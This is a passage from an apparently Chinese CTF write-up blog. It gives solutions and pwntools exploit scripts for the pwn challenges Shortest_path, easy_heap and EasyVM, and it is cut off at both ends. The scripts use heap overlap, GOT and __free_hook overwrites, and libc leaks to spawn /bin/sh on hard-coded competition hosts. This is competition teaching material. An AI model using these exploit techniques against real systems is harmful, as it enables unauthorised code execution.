lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    payload  &#x3D; &#39;a&#39; * 0xF0</span><br><span class="line">    payload +&#x3D; p64(0) + p64(0x311)</span><br><span class="line">    payload +&#x3D; &#39;b&#39; * 0x300</span><br><span class="line">    payload +&#x3D; p64(0) + p64(0x161)</span><br><span class="line">    payload +&#x3D; &#39;c&#39; * 0x150</span><br><span class="line">    payload +&#x3D; p64(0) + p64(0x91)</span><br><span class="line">    payload +&#x3D; p64(0x23333000 - 0x10) + p64(0x23333000 - 0x10)</span><br><span class="line">    edit(0,payload)</span><br><span class="line">    add(1,0x88)</span><br><span class="line">    malloc_message(p64(system)+cyclic(0x28) + p64(binsh))</span><br><span class="line">    call()</span><br><span class="line">    if awd &#x3D;&#x3D; False:</span><br><span class="line">        irt()</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">    context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">    ctx.binary &#x3D; binary_file</span><br><span class="line">    ctx.remote_libc &#x3D; remote_libc_file</span><br><span class="line">    ctx.custom_lib_dir &#x3D; &quot;&#x2F;tools&#x2F;glibc-all-in-one-master&#x2F;libs&#x2F;2.30-0ubuntu2_amd64&#x2F;&quot;</span><br><span class="line">    ctx.debug_remote_libc &#x3D; True</span><br><span class="line">    ctx.remote &#x3D; (remote_ip,remote_port)</span><br><span class="line">    sh &#x3D; ctx.start(&quot;remote&quot;)</span><br><span class="line">    exploit(sh)</span><br></pre></td></tr></table></figure><h2 id="Shortest-path-SOLVED-Solve-咲夜南梦">Shortest_path | SOLVED | Solve: 咲夜南梦</h2><h3 id="这个题目模拟了汽车公交站，简单来说就是带权重的有向图，然后会输出堆里的数据，用gdb打开程序，我自己本地构造了一个flag文件-flag-test-，然后gdb-search这个字符串，竟然发现在堆里有这个字符串，然后malloc次数没有限制了，而且也没有字符串末尾置零，只是堆块末尾置零，所以只需要malloc把flag字符串包含，然后连接flag字符串，然后让俩个车站连接起来，计算一次距离和费用就会输出flag字符串。不知道是不是非预期。">这个题目模拟了汽车公交站，简单来说就是带权重的有向图，然后会输出堆里的数据，用gdb打开程序，我自己本地构造了一个flag文件(flag{test})，然后gdb search这个字符串，竟然发现在堆里有这个字符串，然后malloc次数没有限制了，而且也没有字符串末尾置零，只是堆块末尾置零，所以只需要malloc把flag字符串包含，然后连接flag字符串，然后让俩个车站连接起来，计算一次距离和费用就会输出flag字符串。不知道是不是非预期。</h3><h3 id="exp如下：">exp如下：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">#Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">remote_ip        &#x3D; b&#39;121.37.181.246&#39;</span><br><span class="line">remote_port      &#x3D; 19008</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;Shortest_path&quot;</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">local_libc_file  &#x3D; b&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">remote_libc_file &#x3D; b&#39;&#39;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):</span><br><span class="line">        def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file</span><br><span class="line">        if awd:</span><br><span class="line">                context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">                binary_file &#x3D; (&#39;.&#x2F;%s&#39; % &quot;Shortest_path&quot;) if awd_binary_file &#x3D;&#x3D; &#39;&#39; else awd_binary_file</span><br><span class="line">                context.binary   &#x3D; binary_file</span><br><span class="line">                remote_libc_file &#x3D; b&#39;libc.so.6&#39;</span><br><span class="line">                elf &#x3D; context.binary</span><br><span class="line">        elf &#x3D; context.binary</span><br><span class="line">        if awd or remote:</span><br><span class="line">                lib &#x3D; ELF(remote_libc_file) if remote_libc_file !&#x3D; b&#39;&#39; else &quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">                lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)</span><br><span class="line">        if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">                pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">                pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">        elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">                pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">                pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">        s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">        sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">        ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">        uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">        uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">        ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">        ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">        lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">        def add(station_idx,price,length,name,connected_station_idx&#x3D;[],connected_station_distance&#x3D;[]):</span><br><span class="line">                sla(&quot;---&gt;&quot;,&quot;1&quot;)</span><br><span class="line">                sla(&quot;:&quot;,str(station_idx))</span><br><span class="line">                sla(&quot;:&quot;,str(price))</span><br><span class="line">                sla(&quot;:&quot;,str(length))</span><br><span class="line">                if length &gt;&#x3D; 0:</span><br><span class="line">                        sa(&quot;:&quot;,name)</span><br><span class="line">                sla(&quot;Number of connected station: &quot;,str(len(connected_station_idx)))</span><br><span class="line">                if len(connected_station_idx) &lt;&#x3D; 0:</span><br><span class="line">                        return</span><br><span class="line">                for i in range(len(connected_station_idx)):</span><br><span class="line">                        sla(&quot;:&quot;,str(connected_station_idx[i]))</span><br><span class="line">                        sla(&quot;:&quot;,str(connected_station_distance[i]))</span><br><span class="line">        def show(idx):</span><br><span class="line">                sla(&quot;---&gt;&quot;,&quot;3&quot;)</span><br><span class="line">                sla(&quot;:&quot;,str(idx))</span><br><span class="line">        def free(idx):</span><br><span class="line">                sla(&quot;---&gt;&quot;,&quot;2&quot;)</span><br><span class="line">                sla(&quot;:&quot;,str(idx))</span><br><span class="line">        def calc(idx1,idx2):</span><br><span class="line">                sla(&quot;---&gt;&quot;,&quot;4&quot;)</span><br><span class="line">                sla(&quot;:&quot;,str(idx1))</span><br><span class="line">                sla(&quot;:&quot;,str(idx2))</span><br><span class="line">        add(0,0x1,0x88,&#39;\x11&#39; * 0x88,[0],[50])</span><br><span class="line">        add(1,0x1,0x88,&#39;\x12&#39; * 0x88,[0,1,2],[100,200,300])</span><br><span class="line">        free(0)</span><br><span class="line">        add(2,0x1,0x88,&#39;\x78&#39;,[0,1,2],[10,20,9])</span><br><span class="line">        add(3,0x1,0xFF,(0x240 - 0x1b0) * &#39;a&#39;,[4],[200])</span><br><span class="line">        add(4,0x1,0xFF,(0x240 - 0x1b0) * &#39;a&#39;,[3],[100])</span><br><span class="line">        calc(3,4)</span><br><span class="line">        if awd &#x3D;&#x3D; False:</span><br><span class="line">                irt()</span><br><span class="line">def CTF_exploit(argv):</span><br><span class="line">        global remote_ip,remote_port,binary_file</span><br><span class="line">        argv_len &#x3D; len(argv)</span><br><span class="line">        context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">        context.binary &#x3D; binary_file</span><br><span class="line">        if argv_len &#x3D;&#x3D; 1:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">                return</span><br><span class="line">        elif argv_len &#x3D;&#x3D; 2:</span><br><span class="line">                if argv[1] &#x3D;&#x3D; &quot;remote&quot;:</span><br><span class="line">                        sh &#x3D; remote(remote_ip,remote_port)</span><br><span class="line">                        exploit(sh,remote &#x3D; True)</span><br><span class="line">                        return</span><br><span class="line">                elif argv[1] &#x3D;&#x3D; &quot;local&quot;:</span><br><span class="line">                        sh &#x3D; process(binary_file)</span><br><span class="line">                        exploit(sh)</span><br><span class="line">                        return</span><br><span class="line">                elif argv[1] &#x3D;&#x3D; &quot;awd&quot;:</span><br><span class="line">                        context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">                        sh &#x3D; remote(remote_ip,remote_port)</span><br><span class="line">                        exploit(sh,remote &#x3D; True)</span><br><span class="line">                        return</span><br><span class="line">        elif argv_len &#x3D;&#x3D; 3:</span><br><span class="line">                sh &#x3D; remote(argv[1],argv[2])</span><br><span class="line">                exploit(sh,remote &#x3D; True)</span><br><span class="line">                return</span><br><span class="line">        else:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">        context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">        context.binary &#x3D; binary_file</span><br><span class="line">        sh &#x3D; remote(remote_ip,remote_port)</span><br><span class="line">        exploit(sh,remote &#x3D; True)</span><br></pre></td></tr></table></figure><h2 id="easy-heap-SOLVED-Solve-咲夜南梦">easy_heap | SOLVED | Solve:  咲夜南梦</h2><h3 id="首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc-0x10-，然后在做check，然后再申请check-0x400-，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check-size-fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk-list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free-got为system然后free一个内容为-bin-sh的堆块就可以开启shell。">首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</h3><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">remote_ip        &#x3D; b&#39;121.36.209.145&#39;</span><br><span class="line">remote_port      &#x3D; 9997</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;easyheap&quot;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">local_libc_file  &#x3D; b&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">remote_libc_file &#x3D; b&#39;libc.so.6&#39;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):</span><br><span class="line">        def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file</span><br><span class="line">        if awd:</span><br><span class="line">                context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">                binary_file &#x3D; (&#39;.&#x2F;%s&#39; % &quot;easyheap&quot;) if awd_binary_file &#x3D;&#x3D; &#39;&#39; else awd_binary_file</span><br><span class="line">                context.binary   &#x3D; binary_file</span><br><span class="line">                remote_libc_file &#x3D; b&#39;libc.so.6&#39;</span><br><span class="line">                elf &#x3D; context.binary</span><br><span class="line">        elf &#x3D; context.binary</span><br><span class="line">        if awd or remote:</span><br><span class="line">                lib &#x3D; ELF(remote_libc_file) if remote_libc_file !&#x3D; b&#39;&#39; else &quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">                lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)</span><br><span class="line">        if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">                pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">                pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">        elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">                pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">                pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">        s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">        sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">        ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">        uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">        uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">        ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">        ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">        lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">        chunk_list &#x3D; 0x6020C0</span><br><span class="line">        def add(size,content):</span><br><span class="line">                sla(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">                sla(&quot;?&quot;,str(size))</span><br><span class="line">                if(size &lt; 0x400):</span><br><span class="line">                        sa(&quot;?&quot;,content)</span><br><span class="line">        def edit(idx,content):</span><br><span class="line">                sla(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">                sla(&quot;?&quot;,str(idx))</span><br><span class="line">                sa(&quot;?&quot;,content)</span><br><span class="line">        def free(idx):</span><br><span class="line">                sla(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">                sla(&quot;?&quot;,str(idx))</span><br><span class="line">        add(0x18,0x18 * &quot;\x10&quot;)</span><br><span class="line">        add(0x18,0x18 * &quot;\x11&quot;)</span><br><span class="line">        free(0)</span><br><span class="line">        add(0x500,&#39;&#39;)</span><br><span class="line">        free(1)</span><br><span class="line">        add(0x500,&#39;&#39;)</span><br><span class="line">        add(0x18,0x18 * &#39;\x12&#39;)</span><br><span class="line">        edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">        edit(2,p64(chunk_list + 8) + p64(chunk_list) + p64(elf.got[&#39;free&#39;]))</span><br><span class="line">        edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;__libc_start_main&#39;]) + p64(chunk_list + 0x30) + p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;free&#39;]))</span><br><span class="line">        edit(2,p64(elf.plt[&#39;puts&#39;]))</span><br><span class="line">        free(4)</span><br><span class="line">        __libc_start_main &#x3D; ru7f()</span><br><span class="line">        libc &#x3D; __libc_start_main - lib.symbols[b&#39;__libc_start_main&#39;]</span><br><span class="line">        lib.address &#x3D; libc</span><br><span class="line">        system &#x3D; lib.symbols[b&#39;system&#39;]</span><br><span class="line">        binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">        edit(5,p64(system))</span><br><span class="line">        edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">        free(0)</span><br><span class="line">        if awd &#x3D;&#x3D; False:</span><br><span class="line">                irt()</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">        context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">        context.binary &#x3D; binary_file</span><br><span class="line">        sh &#x3D; remote(remote_ip,remote_port)</span><br><span class="line">        exploit(sh,remote &#x3D; True)</span><br></pre></td></tr></table></figure><h2 id="EasyVM-SOVLED-Solve-咲夜南梦">EasyVM | SOVLED | Solve: 咲夜南梦</h2><h3 id="首先需要逆指令，我们发现大概有11个模拟寄存器，reg-8-是pc寄存器，reg-6-是sp寄存器，然后着重观察写操作、putchar和getchar，因为这样的组合理论上我们可以任意地址读写。由于putchar只能读一字节，所以可以凑一个putchar任意地址的vm指令，然后同时执行四次就可以打印出任意地址的值了，通过vm-opcode为0x9和0x11可以leak-pie，然后知道pie了之后，我们就定位了got的地址，通过0x71将欲读指针放入reg-6-的栈顶，然后通过0x76指令pop到reg-3-，接着通过0x53或者0x54就可以实现读写操作了，所以总的思路就是通过putchar来leak-libc算出-free-hook和system，然后通过getchar将system写入-free-hook。接着就是控制free堆块内容了，可以通过0x80指令，但是0x80后面需要空一位，这里有点坑，因为reg-8-6，所以应该是0x80-任意字节-四字节字符串，懒得构造-bin-sh，就直接构造sh即可。">首先需要逆指令，我们发现大概有11个模拟寄存器，reg[8]是pc寄存器，reg[6]是sp寄存器，然后着重观察写操作、putchar和getchar，因为这样的组合理论上我们可以任意地址读写。由于putchar只能读一字节，所以可以凑一个putchar任意地址的vm指令，然后同时执行四次就可以打印出任意地址的值了，通过vm_opcode为0x9和0x11可以leak pie，然后知道pie了之后，我们就定位了got的地址，通过0x71将欲读指针放入reg[6]的栈顶，然后通过0x76指令pop到reg[3]，接着通过0x53或者0x54就可以实现读写操作了，所以总的思路就是通过putchar来leak libc算出__free_hook和system，然后通过getchar将system写入__free_hook。接着就是控制free堆块内容了，可以通过0x80指令，但是0x80后面需要空一位，这里有点坑，因为reg[8] + 6，所以应该是0x80 任意字节 四字节字符串，懒得构造/bin/sh，就直接构造sh即可。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;CRITICAL&#39;</span><br><span class="line">remote_ip        &#x3D; b&#39;121.36.215.224&#39;</span><br><span class="line">remote_port      &#x3D; 9999</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;EasyVM&quot;</span><br><span class="line">remote_libc_file &#x3D; &quot;libc-2.23.so&quot;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False):</span><br><span class="line">    elf &#x3D; ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib &#x3D; ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib &#x3D; ctx.libc</span><br><span class="line">    def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">        pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">        pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">    elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">        pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">        pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">    s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">    ru7f    &#x3D; lambda                    